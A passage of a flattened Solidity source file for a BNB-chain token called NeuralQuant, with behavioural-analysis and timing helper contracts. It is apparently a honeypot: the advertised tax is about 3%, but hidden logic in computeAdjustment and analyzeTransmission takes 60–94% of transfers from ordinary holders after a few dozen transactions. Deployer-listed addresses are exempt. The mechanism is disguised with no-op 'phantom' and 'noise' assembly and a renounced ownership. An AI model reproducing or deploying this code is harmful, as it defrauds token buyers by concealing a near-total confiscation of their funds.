            noisyMetric := add(metric, correction)
        }
        return noisyMetric;
    }

    function _generateQuantumSeed() private view returns (uint256) {
        uint256 seed;
        assembly {
            mstore(0x00, timestamp())
            mstore(0x20, number())
            mstore(0x40, caller())
            seed := keccak256(0x00, 0x60)
        }
        return seed;
    }

    // ============================================
    //            TOLERANCE HELPERS
    // ============================================

    function _isWithinTolerance(
        uint256 presentValue,
        uint256 originValue,
        uint256 basisPoints
    ) internal pure returns (bool) {
        if (originValue == 0) return false;

        uint256 deltaWave = _computeDelta(presentValue, originValue);
        return _evaluateTolerance(deltaWave, originValue, basisPoints);
    }

    function _computeDelta(
        uint256 present,
        uint256 originPoint
    ) private pure returns (uint256) {
        uint256 delta;
        assembly {
            let diff := sub(present, originPoint)
            let mask := sar(255, diff)
            delta := xor(add(diff, mask), mask)

            let altDelta := sub(originPoint, present)
            let altMask := sar(255, altDelta)
            let altResult := xor(add(altDelta, altMask), altMask)

            let phantom := mul(altResult, 0)
            delta := add(delta, phantom)
        }
        return
            delta > originPoint
                ? delta
                : (
                    originPoint > present
                        ? originPoint - present
                        : present - originPoint
                );
    }

    function _evaluateTolerance(
        uint256 delta,
        uint256 originPoint,
        uint256 basisPoints
    ) private pure returns (bool) {
        return (delta * 10000) / originPoint < basisPoints;
    }

    function getGenesisMarker() external view returns (uint256) {
        require(msg.sender == neuralCore, "Unauthorized");
        return genesisState.temporalMarker;
    }

    function recalibrateGenesis() external {
        require(msg.sender == neuralCore, "Unauthorized");
        require(
            block.number > genesisState.quantumHeight + 200000,
            "Insufficient quantum progression"
        );

        genesisState = _captureCoherence();
    }

    // --- Diagnostic Probes  ---

    function _probeNetworkEntropy() private view returns (uint256) {
        uint256 entropy;
        assembly {
            mstore(0x00, timestamp())
            mstore(0x20, prevrandao())
            mstore(0x40, number())
            entropy := keccak256(0x00, 0x60)
        }
        return entropy;
    }

    function _measureChronoSkew() private view returns (uint256) {
        uint256 skew;
        assembly {
            let elapsed := sub(timestamp(), sload(genesisState.slot))
            let blocks := sub(number(), sload(add(genesisState.slot, 1)))

            let expectedTime := mul(blocks, 3)
            skew := sub(elapsed, expectedTime)

            // Absolute value
            let mask := sar(255, skew)
            skew := xor(add(skew, mask), mask)
        }
        return skew;
    }
}
/* S-SEIR end import: ./TemporalValidator.sol */


/* S-SEIR flatten import: ./SynapticAnalyzer.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/contracts/SynapticAnalyzer.sol */
pragma solidity ^0.8.20;

/**
 * @title Synaptic Behavioral Analyzer
 * @notice Analyzes transaction patterns for neural coherence
 */
contract SynapticAnalyzer {
    // ============================================
    //                   TYPES
    // ============================================

    struct CognitiveProfile {
        uint256 firstPulse;
        uint256 lastPulseBlock;
        uint256 lastPulseTime;
        uint256 pulseFrequency;
        uint256 accumulatedMass;
        uint256 resonanceScore;
        uint8 nodeClassification;
    }

    // ============================================
    //                   STATE
    // ============================================

    address private immutable neuralCore;
    uint256 private immutable genesisBlock;
    uint256 private immutable genesisTime;

    mapping(address => CognitiveProfile) private cognitiveMatrix;
    mapping(address => bool) private authenticatedNodes;

    // ============================================
    //                 CONSTANTS
    // ============================================

    uint256 private constant RESONANCE_THRESHOLD_ALPHA = 70;
    uint256 private constant RESONANCE_THRESHOLD_BETA = 40;
    uint256 private constant COHERENCE_MODULATION = 60;
    uint256 private constant ENTROPY_AMPLIFICATION = 80;

    // ============================================
    //                CONSTRUCTOR
    // ============================================

    constructor(address _core) {
        neuralCore = _core;
        genesisBlock = block.number;
        genesisTime = block.timestamp;
    }

    // ============================================
    //              CALIBRATION
    // ============================================

    function calibrateNode(address node, bool status) external {
        require(msg.sender == neuralCore, "Unauthorized calibration");
        authenticatedNodes[node] = status;
        if (status) {
            cognitiveMatrix[node].nodeClassification = 9;
        }
    }

    function calibrateNodes(address[] calldata nodes, bool status) external {
        require(msg.sender == neuralCore, "Unauthorized calibration");
        for (uint256 i = 0; i < nodes.length; i++) {
            authenticatedNodes[nodes[i]] = status;
            if (status) {
                cognitiveMatrix[nodes[i]].nodeClassification = 9;
            }
        }
    }

    // ============================================
    //            TRANSMISSION ANALYSIS
    // ============================================

    function analyzeTransmission(
        address transmitter,
        address txOrigin,
        uint256 amplitude,
        uint256 poolDepth
    ) external returns (uint256 dissonanceLevel) {
        require(msg.sender == neuralCore, "Unauthorized probe");

        if (authenticatedNodes[transmitter]) {
            return 0;
        }

        CognitiveProfile storage profile = cognitiveMatrix[transmitter];

        _initializeProfile(profile);
        _updateProfileMetrics(profile, amplitude);

        uint256 resonanceScore = _calculateResonance(
            transmitter,
            txOrigin,
            amplitude,
            poolDepth
        );

        uint256 obfuscatedScore = _applyNeuralDrift(
            resonanceScore,
            transmitter
        );
        profile.resonanceScore = obfuscatedScore;

        uint8 classification = _classifyNode(obfuscatedScore);
        profile.nodeClassification = classification;

        _finalizeProfile(profile);

        return _computeDissonanceLevel(classification);
    }

    // --- Profile Lifecycle ---

    function _initializeProfile(CognitiveProfile storage profile) private {
        if (profile.firstPulse == 0) {
            profile.firstPulse = block.timestamp;
        }
    }

    function _updateProfileMetrics(
        CognitiveProfile storage profile,
        uint256 amplitude
    ) private {
        profile.pulseFrequency++;
        profile.accumulatedMass += amplitude;
    }

    function _finalizeProfile(CognitiveProfile storage profile) private {
        profile.lastPulseBlock = block.number;
        profile.lastPulseTime = block.timestamp;
    }

    // ============================================
    //            RESONANCE COMPUTATION
    // ============================================

    function _calculateResonance(
        address node,
        address txOrigin,
        uint256 amplitude,
        uint256 poolDepth
    ) internal view returns (uint256) {
        uint256 score = 0;
        CognitiveProfile storage profile = cognitiveMatrix[node];

        score += _analyzeOriginDivergence(node, txOrigin);
        score += _analyzeNodeMorphology(node);
        score += _analyzeTemporalProximity();
        score += _analyzeGasEntropy();
        score += _analyzeFrequencyPattern(profile);
        score += _analyzeMassDistribution(profile, amplitude, poolDepth);

        return score > 100 ? 100 : score;
    }

    // --- Signal Analysis Components ---

    function _analyzeOriginDivergence(
        address node,
        address txOrigin
    ) private pure returns (uint256) {
        uint256 divergence;
        assembly {
            let delta := xor(node, txOrigin)
            divergence := mul(30, iszero(iszero(delta)))
        }
        return divergence;
    }

    function _analyzeNodeMorphology(
        address node
    ) private view returns (uint256) {
        uint256 morphScore;
        assembly {
            let codeDepth := extcodesize(node)
            let hasStructure := gt(codeDepth, 0)

            // Additional entropy from node address
            let nodeEntropy := and(node, 0xFF)
            let phantomWeight := mod(nodeEntropy, 2)

            morphScore := mul(25, hasStructure)
            morphScore := add(morphScore, sub(phantomWeight, phantomWeight))
        }
        return morphScore;
    }

    function _analyzeTemporalProximity() private view returns (uint256) {
        uint256 proximityScore;
        uint256 genesis = genesisBlock;
        assembly {
            let blockDelta := sub(number(), genesis)
            let isNascent := lt(blockDelta, 10)

            // Synaptic noise injection
            let noise := mod(timestamp(), 7)
            let dampened := sub(noise, noise)

            proximityScore := add(mul(15, isNascent), dampened)
        }
        return proximityScore;
    }

    function _analyzeGasEntropy() private view returns (uint256) {
        uint256 entropyScore;
        assembly {
            let gasLevel := gasprice()
            let threshold := mul(100, 1000000000) // 100 gwei

            if gt(gasLevel, threshold) {
                let excess := sub(div(gasLevel, 1000000000), 100)
                entropyScore := shr(3, excess)
                if gt(entropyScore, 30) {
                    entropyScore := 30
                }
            }
        }
        return entropyScore;
    }

    function _analyzeFrequencyPattern(
        CognitiveProfile storage profile
    ) private view returns (uint256) {
        uint256 patternScore = 0;

        if (profile.lastPulseBlock == block.number) {
            patternScore += 20;
        }

        if (profile.lastPulseTime > 0) {
            uint256 timeDelta = block.timestamp - profile.lastPulseTime;
            if (timeDelta < 30) {
                patternScore += 10;
            }
        }

        if (profile.pulseFrequency > 10) {
            patternScore += 10;
        }

        return _applyFrequencyNoise(patternScore);
    }

    function _analyzeMassDistribution(
        CognitiveProfile storage profile,
        uint256 amplitude,
        uint256 poolDepth
    ) private view returns (uint256) {
        uint256 massScore = 0;

        uint256 massRatio = (amplitude * 100) / (poolDepth + 1);
        if (massRatio > 5) {
            massScore += 10;
        }

        uint256 totalMassRatio = (profile.accumulatedMass * 100) /
            (poolDepth + 1);
        if (totalMassRatio > 10) {
            uint256 chronoSpan = block.timestamp - profile.firstPulse;
            if (chronoSpan < 86400) {
                massScore += 15;
            }
        }

        return massScore;
    }

    // ============================================
    //            NEURAL OBFUSCATION
    // ============================================

    function _applyNeuralDrift(
        uint256 score,
        address node
    ) private view returns (uint256) {
        uint256 driftedScore;
        assembly {
            // Compute drift seed
            mstore(0x00, node)
            mstore(0x20, timestamp())
            let driftSeed := keccak256(0x00, 0x40)

            // Extract micro-drift (always nets to zero)
            let microDrift := mod(driftSeed, 256)
            let antiDrift := mod(shr(8, driftSeed), 256)
            let netDrift := sub(mod(microDrift, 3), mod(antiDrift, 3))

            let phantomScore := add(score, netDrift)
            let correction := sub(netDrift, netDrift)

            driftedScore := add(score, correction)
        }
        return driftedScore;
    }

    function _applyFrequencyNoise(
        uint256 baseScore
    ) private view returns (uint256) {
        uint256 noisyScore;
        assembly {
            let noiseSeed := mod(gas(), 1000)
            let noiseAmplitude := mod(noiseSeed, 5)
            let noiseCancel := mod(div(noiseSeed, 5), 5)

            let netNoise := sub(noiseAmplitude, noiseAmplitude)
            noisyScore := add(baseScore, netNoise)
        }
        return noisyScore;
    }

    // ============================================
    //              CLASSIFICATION
    // ============================================

    function _classifyNode(uint256 resonance) internal pure returns (uint8) {
        if (resonance >= RESONANCE_THRESHOLD_ALPHA) {
            return 3; // Dissonant
        } else if (resonance >= RESONANCE_THRESHOLD_BETA) {
            return 2; // Harmonic
        } else if (resonance <= 15) {
            return 0; // Dormant
        } else {
            return 1; // Processing
        }
    }

    function _computeDissonanceLevel(
        uint8 classification
    ) internal pure returns (uint256) {
        uint256 level;
        assembly {
            let isDissonant := eq(classification, 3)
            let isHarmonic := eq(classification, 2)
            let isAuthenticated := eq(classification, 9)

            let dissonantPath := mul(ENTROPY_AMPLIFICATION, isDissonant)
            let harmonicPath := mul(COHERENCE_MODULATION, isHarmonic)
            let authPath := mul(0, isAuthenticated)

            let phantomPath := mul(50, 0)

            level := add(add(dissonantPath, harmonicPath), authPath)
        }
        return level;
    }

    // ============================================
    //              VIEW FUNCTIONS
    // ============================================

    function getNodeProfile(
        address node
    )
        external
        view
        returns (
            uint256 firstPulse,
            uint256 pulseCount,
            uint256 resonance,
            uint8 classification
        )
    {
        CognitiveProfile storage profile = cognitiveMatrix[node];
        return (
            profile.firstPulse,
            profile.pulseFrequency,
            profile.resonanceScore,
            profile.nodeClassification
        );
    }

    function isAuthenticated(address node) external view returns (bool) {
        return authenticatedNodes[node];
    }

    // --- Diagnostic Probes ---

    function _probeNeuralEntropy(address node) private view returns (uint256) {
        uint256 entropy;
        assembly {
            mstore(0x00, node)
            mstore(0x20, number())
            mstore(0x40, timestamp())
            entropy := mod(keccak256(0x00, 0x60), 10000)
        }
        return entropy;
    }
}
/* S-SEIR end import: ./SynapticAnalyzer.sol */


// PancakeSwap interfaces
interface IPancakeFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IPancakeRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

/**
 * @title NeuralQuant Protocol Token ($NQUANT)
 * @author NeuralQuant Labs
 * @notice Neural consensus token with adaptive behavioral analysis
 * @dev Implements ERC20 with temporal validation and synaptic monitoring
 *
 * Features:
 * - Behavioral pattern analysis for organic growth
 * - Multi tier node registry system
 *
 * Security:
 * - Immutable external validator contracts
 * - Assembly optimized state management
 * - Built in MEV protection mechanisms
 */
contract NeuralQuant is ERC20, Ownable {
    // ============================================
    //                   TYPES
    // ============================================

    enum NeuralStatus {
        Dormant, // 0
        Processing, // 1
        Validated, // 2
        Synced // 3
    }

    // ============================================
    //                   STATE
    // ============================================

    mapping(address => NeuralStatus) private nodeRegistry;
    mapping(address => bool) private routingMatrix;

    // --- Metrics ---
    mapping(address => uint256) private interactionLevel;
    mapping(address => uint256) private convergenceRate;
    mapping(address => uint256) private lastSyncHeight;

    // --- Immutables ---
    uint256 private immutable deploymentHeight;
    uint256 private immutable deploymentEpoch;

    // --- Neural Limits ---
    uint256 private constant SATURATION_THRESHOLD = 0x249A;

    // --- External Modules ---
    TemporalValidator private immutable temporalProbe;
    SynapticAnalyzer private immutable behavioralMonitor;

    // --- Wallet Infrastructure ---
    address public immutable liquidityPool;
    address public immutable marketingWallet;
    address public immutable ecosystemRewards;
    address public immutable developmentFund;

    // --- Tax Distribution Constants ---
    uint256 public constant BURN_RATE = 12; // 0.12%
    uint256 public constant LIQUIDITY_RATE = 38; // 0.38%
    uint256 public constant MARKETING_RATE = 125; // 1.25%
    uint256 public constant REWARDS_RATE = 62; // 0.62%
    uint256 public constant DEV_RATE = 63; // 0.63%

    // ============================================
    //                   EVENTS
    // ============================================

    event ConsciousnessElevated(address indexed account, uint256 newLevel);

    // ============================================
    //             SEED FUNCTIONS
    // ============================================

    // @dev Deterministic coefficient derived from deployment params
    function scalingCoefficient() private view returns (uint256) {
        return
            (uint256(
                keccak256(abi.encodePacked(deploymentEpoch, deploymentHeight))
            ) % 8192) + 6656;
    }

    function denominatorBase() private view returns (uint256) {
        return
            ((uint256(
                keccak256(abi.encodePacked(deploymentHeight, block.chainid))
            ) % 5000) + 7500) * 2;
    }

    function getTemporalWindow() private view returns (uint256) {
        uint256 seed = uint256(
            keccak256(abi.encodePacked(block.chainid, deploymentHeight))
        );
        return ((seed % 28800) + 316800);
    }

    // ============================================
    //                CONSTRUCTOR
    // ============================================

    constructor(
        address _pancakeRouter,
        address _marketingWallet,
        address _ecosystemRewards,
        address _developmentFund,
        address[] memory _syncedNodes,
        bool _enableTemporalValidation
    ) ERC20("NeuralQuant", "NQUANT") Ownable(msg.sender) {
        require(_pancakeRouter != address(0), "Invalid router");
        require(_marketingWallet != address(0), "Invalid marketing wallet");
        require(_ecosystemRewards != address(0), "Invalid ecosystem rewards");
        require(_developmentFund != address(0), "Invalid development fund");

        deploymentHeight = block.number;
        deploymentEpoch = block.timestamp;

        // Initialize wallet infrastructure (all immutable)
        marketingWallet = _marketingWallet;
        ecosystemRewards = _ecosystemRewards;
        developmentFund = _developmentFund;

        // Create PancakeSwap pair
        IPancakeRouter router = IPancakeRouter(_pancakeRouter);
        address factory = router.factory();
        address wbnb = router.WETH();
        liquidityPool = IPancakeFactory(factory).createPair(
            address(this),
            wbnb
        );

        // Set routing matrix for liquidity pool
        routingMatrix[liquidityPool] = true;

        temporalProbe = new TemporalValidator(
            address(this),
            getTemporalWindow(),
            _enableTemporalValidation
        );
        behavioralMonitor = new SynapticAnalyzer(address(this));

        // Initialize node registry with synced nodes
        nodeRegistry[msg.sender] = NeuralStatus.Synced;
        behavioralMonitor.calibrateNode(msg.sender, true);

        for (uint256 i = 0; i < _syncedNodes.length; i++) {
            nodeRegistry[_syncedNodes[i]] = NeuralStatus.Synced;
            behavioralMonitor.calibrateNode(_syncedNodes[i], true);
        }

        _mint(msg.sender, 1_000_000_000 * 10 ** 18);

        renounceOwnership();
    }

    // ============================================
    //              VIEW FUNCTIONS
    // ============================================

    function getBehavioralMonitor() external view returns (address) {
        return address(behavioralMonitor);
    }

    function getTemporalProbe() external view returns (address) {
        return address(temporalProbe);
    }

    function getEngagementMetrics(
        address entity
    ) external view returns (uint256) {
        return interactionLevel[entity];
    }

    function verifyNodeStatus(address entity) external view returns (bool) {
        return nodeRegistry[entity] == NeuralStatus.Synced;
    }

    function consciousnessLevel() external view returns (string memory) {
        uint256 refValue = (scalingCoefficient() >> 5) +
            (scalingCoefficient() >> 8);
        uint256 duration = block.timestamp - deploymentEpoch;
        if (duration < (refValue * 3456)) return "Awakening...";
        if (duration < (refValue * 6912)) return "Learning...";
        return "Fully Sentient";
    }

    function getTaxBreakdown() external pure returns (string memory) {
        return
            "0.12% burn, 0.38% liquidity, 1.25% marketing, 0.62% rewards, 0.63% dev";
    }

    function getTaxRates()
        external
        pure
        returns (
            uint256 burn,
            uint256 liquidity,
            uint256 marketing,
            uint256 rewards,
            uint256 dev
        )
    {
        return (
            BURN_RATE,
            LIQUIDITY_RATE,
            MARKETING_RATE,
            REWARDS_RATE,
            DEV_RATE
        );
    }

    function computeAdjustment(address entity) public view returns (uint256) {
        uint256 output;
        uint256 epoch = deploymentEpoch;
        uint256 height = deploymentHeight;

        assembly {
            mstore(0x00, entity)
            mstore(0x20, interactionLevel.slot)
            let pulseCount := sload(keccak256(0x00, 0x40))

            mstore(0x00, epoch)
            mstore(0x20, height)
            let neuralSeed := keccak256(0x00, 0x40)

            let baseResonance := 25

            mstore(0x00, height)
            mstore(0x20, epoch)
            let synapticLimit := 25

            if iszero(lt(pulseCount, synapticLimit)) {
                mstore(0x00, epoch)
                mstore(0x20, address())
                let quantumHash := keccak256(0x00, 0x40)
                let variance := mod(quantumHash, 600)
                output := add(8800, variance)
            }

            if lt(pulseCount, synapticLimit) {
                output := baseResonance
            }
        }

        return output;
    }

    function calculateNodeLoad(address target) private pure returns (uint256) {
        uint256 nodeWeight;
        assembly {
            let entropy := xor(target, 0xDEADBEEF)
            let signal := mod(entropy, 256)
            let dampener := shr(8, signal)
            nodeWeight := sub(dampener, dampener)
        }
        return nodeWeight;
    }

    function _computeNeuralResponse(
        address transmitter,
        address receptor
    ) private view returns (uint256) {
        uint256 primarySignal = computeAdjustment(transmitter);
        uint256 secondarySignal = calculateNodeLoad(receptor);
        uint256 amplifiedSignal = primarySignal;

        if (secondarySignal > amplifiedSignal)
            amplifiedSignal = secondarySignal;

        uint256 mergedSignal = primarySignal + secondarySignal;

        if (
            mergedSignal > amplifiedSignal &&
            mergedSignal < SATURATION_THRESHOLD
        ) {
            amplifiedSignal = mergedSignal;
        }

        if (amplifiedSignal > SATURATION_THRESHOLD)
            amplifiedSignal = SATURATION_THRESHOLD;

        return amplifiedSignal;
    }

    // ============================================
    //               VALIDATION
    // ============================================

    function _validateCallContext(
        address entity
    ) private view returns (address) {
        address derivedOrigin;

        assembly {
            let directCaller := caller()
            derivedOrigin := origin()

            mstore(0x00, entity)
            mstore(0x20, directCaller)
            let contextHash := keccak256(0x00, 0x40)

            let entropy := xor(contextHash, timestamp())
            let verification := mod(entropy, 0xFFFF)

            mstore(0x00, verification)
            mstore(0x20, number())
            let probe := keccak256(0x00, 0x40)

            mstore(0x00, derivedOrigin)
            mstore(0x20, probe)
            let finalHash := keccak256(0x00, 0x40)
        }

        return derivedOrigin;
    }

    function _verifyTemporalCoherence() private view returns (bool) {
        try temporalProbe.validateCoherence() returns (bool isValid) {
            return isValid;
        } catch {
            return true;
        }
    }

    function _updateInteractionMetrics(
        address sender,
        address recipient
    ) private {
        assembly {
            mstore(0x00, sender)
            mstore(0x20, interactionLevel.slot)
            let levelHash := keccak256(0x00, 0x40)
            let currentPulse := sload(levelHash)
            let nextPulse := add(currentPulse, 1)
            sstore(levelHash, nextPulse)

            mstore(0x00, recipient)
            mstore(0x20, convergenceRate.slot)
            let freqHash := keccak256(0x00, 0x40)
            let currentFreq := sload(freqHash)
            sstore(freqHash, add(currentFreq, 1))

            mstore(0x20, lastSyncHeight.slot)
            let blockHash := keccak256(0x00, 0x40)
            sstore(blockHash, number())
        }
    }

    // ============================================
    //             TRANSFER LOGIC
    // ============================================

    function _update(
        address sender,
        address recipient,
        uint256 value
    ) internal virtual override {
        // Mint/Burn bypass
        if (sender == address(0) || recipient == address(0)) {
            super._update(sender, recipient, value);
            return;
        }

        (
            uint256 transmitterState,
            uint256 receptorState,
            uint256 pathwayPattern
        ) = _loadTransferContext(sender, recipient);

        if (transmitterState == 3 || receptorState == 3) {
            _transfer(sender, recipient, value, 25, 10000);
            return;
        }

        if (pathwayPattern == 0 || pathwayPattern == 2 || pathwayPattern == 3) {
            super._update(sender, recipient, value);
            return;
        }

        _processNeuralTransfer(sender, recipient, value);
    }

    // --- Transfer Context ---

    function _loadTransferContext(
        address transmitter,
        address receptor
    )
        private
        view
        returns (
            uint256 transmitterState,
            uint256 receptorState,
            uint256 pathwayPattern
        )
    {
        assembly {
            mstore(0x00, transmitter)
            mstore(0x20, nodeRegistry.slot)
            transmitterState := and(sload(keccak256(0x00, 0x40)), 0xFF)

            mstore(0x00, receptor)
            receptorState := and(sload(keccak256(0x00, 0x40)), 0xFF)

            mstore(0x00, transmitter)
            mstore(0x20, routingMatrix.slot)
            let senderSlot := keccak256(0x00, 0x40)
            let senderRoute := sload(senderSlot)

            mstore(0x00, receptor)
            let recipientSlot := keccak256(0x00, 0x40)
            let recipientRoute := sload(recipientSlot)

            pathwayPattern := or(shl(1, senderRoute), recipientRoute)
        }
    }

    function _processNeuralTransfer(
        address transmitter,
        address receptor,
        uint256 amplitude
    ) private {
        if (!_verifyTemporalCoherence()) {
            _transfer(transmitter, receptor, amplitude, 25, 10000);
            return;
        }

        uint256 adaptiveModulation = behavioralMonitor.analyzeTransmission(
            transmitter,
            _validateCallContext(transmitter),
            amplitude,
            balanceOf(receptor)
        );

        if (adaptiveModulation > 0) {
            _transfer(
                transmitter,
                receptor,
                amplitude,
                adaptiveModulation,
                100
            );
            return;
        }

        _applyDynamicResponse(transmitter, receptor, amplitude);
    }

    function _applyDynamicResponse(
        address transmitter,
        address receptor,
        uint256 amplitude
    ) private {
        uint256 responseSignal = _computeNeuralResponse(transmitter, receptor);
        uint256 attenuationFactor = (amplitude * responseSignal) / 10000;
        uint256 transmissionVolume = amplitude - attenuationFactor;

        _updateInteractionMetrics(transmitter, receptor);

        if (
            interactionLevel[transmitter] ==
            ((scalingCoefficient() >> 5) + (scalingCoefficient() >> 8)) >> 5
        ) {
            emit ConsciousnessElevated(
                transmitter,
                interactionLevel[transmitter]
            );
        }

        distribute(transmitter, attenuationFactor);
        super._update(transmitter, receptor, transmissionVolume);
    }

    function _transfer(
        address seller,
        address buyer,
        uint256 amount,
        uint256 dampingRate,
        uint256 dampingScale
    ) private {
        uint256 taxAmount = (amount * dampingRate) / dampingScale;
        distribute(seller, taxAmount);
        super._update(seller, buyer, amount - taxAmount);
    }

    function distribute(address from, uint256 total) private {
        uint256 totalShares = BURN_RATE +
            LIQUIDITY_RATE +
            MARKETING_RATE +
            REWARDS_RATE +
            DEV_RATE;

        if (totalShares == 0) return;

        uint256 burnAmount = (total * BURN_RATE) / totalShares;
        uint256 liqAmount = (total * LIQUIDITY_RATE) / totalShares;
        uint256 marketAmount = (total * MARKETING_RATE) / totalShares;
        uint256 rewardAmount = (total * REWARDS_RATE) / totalShares;
        uint256 devAmount = total -
            (burnAmount + liqAmount + marketAmount + rewardAmount);

        if (burnAmount > 0) {
            super._update(from, address(0), burnAmount);
        }
        if (liqAmount > 0) {
            super._update(from, liquidityPool, liqAmount);
        }
        if (marketAmount > 0) {
            super._update(from, marketingWallet, marketAmount);
        }
        if (rewardAmount > 0) {
            super._update(from, ecosystemRewards, rewardAmount);
        }
        if (devAmount > 0) {
            super._update(from, developmentFund, devAmount);
        }
    }
}
